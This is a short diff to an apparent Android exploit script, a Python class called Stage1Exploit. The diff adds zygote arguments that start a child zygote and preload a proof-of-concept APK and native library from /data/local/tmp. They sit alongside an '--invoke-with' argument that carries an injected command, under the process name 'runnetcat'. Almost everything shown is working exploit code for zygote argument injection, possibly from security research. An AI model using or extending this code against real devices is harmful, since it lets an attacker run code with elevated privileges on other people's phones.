@@ -194,6 +194,13 @@ class Stage1Exploit:
             "--seinfo=network_stack:privapp:targetSdkVersion=28:complete",
             "--nice-name=runnetcat",
             "--runtime-flags=1",
+            "--start-child-zygote",
+            "--preload-package",
+            "/data/local/tmp/dumppoc.apk",
+            "/data/local/tmp",
+            "libdumppoc.so",
+            "dummy_cache",
+            "--zygote-socket=test_socket",
             "--invoke-with",
             f"{command}#",
         ]
